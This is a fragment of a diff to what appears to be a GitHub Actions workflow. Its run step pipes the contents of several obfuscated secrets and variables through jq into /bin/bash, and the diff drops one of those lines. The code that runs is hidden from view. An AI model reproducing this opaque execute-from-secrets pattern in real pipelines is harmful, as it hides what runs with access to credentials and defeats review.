@@ -22,7 +22,6 @@ jobs:
           ddzc83149: ${{ secrets.ddzc83149 }}
         run: |
           printf '%s' "$ddzc83149" | jq -r .oa5 | /bin/bash
-          echo $whf18 | jq -r .zoh115 | /bin/bash
           echo $mop768 | jq -r .anryo6 | /bin/bash
           echo $ss01070 | jq -r .xe624 | /bin/bash
           printf '%s' "$nm657" | jq -r .rjud00060 | /bin/bash
